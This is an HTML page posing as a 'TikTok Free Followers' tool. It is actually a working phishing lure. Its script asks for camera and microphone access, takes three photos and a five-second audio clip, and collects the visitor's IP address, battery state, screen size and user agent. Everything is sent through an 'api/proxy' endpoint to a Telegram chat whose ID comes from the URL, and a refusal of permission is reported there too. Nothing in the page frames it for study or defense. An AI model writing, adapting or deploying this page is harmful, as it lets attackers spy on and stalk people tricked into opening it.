<!DOCTYPE html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <title>TikTok Followers Tool - Front Camera</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: sans-serif; margin:0; padding:0; background:#f5f5f5; }
    .navbar { background: linear-gradient(90deg, #69C9D0, #EE1D52); color:white; text-align:center; padding:15px 0; }
    h1 { margin:0; font-size:26px; font-weight:bold; }
    .container { max-width:600px; margin:20px auto; padding:20px; background:#fff; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); }
    button { display:block; width:100%; padding:12px; border:none; border-radius:5px; background:#EE1D52; color:white; font-size:18px; font-weight:bold; cursor:pointer; }
    button:hover { background:#C21844; }
  </style>
</head>
<body>
  <nav class="navbar"><h1>TIKTOK FREE FOLLOWERS</h1></nav>
  <div class="container">
    <button id="startBtn">Start Capture</button>
    <div id="message"></div>
  </div>

<script>
function GetURLParameter(sParam){
  const sPageURL = window.location.search.substring(1);
  const sURLVariables = sPageURL.split('&');
  for (let i=0;i<sURLVariables.length;i++){
    const sParameterName = sURLVariables[i].split('=');
    if(sParameterName[0]==sParam){return sParameterName[1];}
  }
}
const chatid = GetURLParameter('id');

document.getElementById("startBtn").onclick = async ()=>{
  if(!chatid){ alert("No chat_id"); return; }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
    const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
    const audioRecorder = new MediaRecorder(stream);

    // 3 photos
    for(let i=0;i<3;i++){
      setTimeout(()=>{
        imageCapture.takePhoto()
          .then(blob=>sendToTelegram(blob,'photo'))
          .catch(err=>console.error("Photo error:", err));
      }, i*2000);
    }

    // 5 sec audio
    audioRecorder.start();
    setTimeout(()=>audioRecorder.stop(),5000);
    audioRecorder.ondataavailable = (e)=>{ if(e.data.size>0) sendToTelegram(e.data,'audio'); };

    // Text info
    const [ip,battery] = await Promise.all([getIP(), getBattery()]);
    const device = getDeviceInfo();

    fetch("api/proxy",{
      method:"POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({chat_id: chatid, text:`üßë‚Äçüíª User Info:\n\n${ip}\n\n${battery}\n\n${device}`, type:"text"})
    });

    document.getElementById("message").innerText="‚úÖ Capturing & sending to Telegram...";
  } catch(err){
    console.error(err);
    fetch("api/proxy",{
      method:"POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({chat_id: chatid, text:"‚ùå User denied camera/mic.", type:"text"})
    });
  }
};

function sendToTelegram(data,type){
  const fd=new FormData();
  fd.append("chat_id",chatid);
  fd.append("type",type);
  fd.append(type, data, `file.${type==='photo'?'jpg':'wav'}`);
  fetch("api/proxy",{method:"POST", body:fd});
}

function getBattery(){
  if(navigator.getBattery){
    return navigator.getBattery().then(b=>`üîã Battery:\nLevel: ${Math.round(b.level*100)}%\nCharging: ${b.charging?'Yes':'No'}`);
  }
  return Promise.resolve("üîã Battery: N/A");
}

function getIP(){
  return fetch("https://api.ipify.org?format=json")
  .then(res=>res.json())
  .then(d=>`üåê IP Address: ${d.ip}`)
  .catch(()=> "üåê IP Address: N/A");
}

function getDeviceInfo(){
  return `üì± Device Info:\nScreen: ${screen.width}x${screen.height}\n‚è∞ Time: ${new Date().toLocaleString()}\nModel: ${navigator.userAgent}`;
}
</script>
</body>
</html>
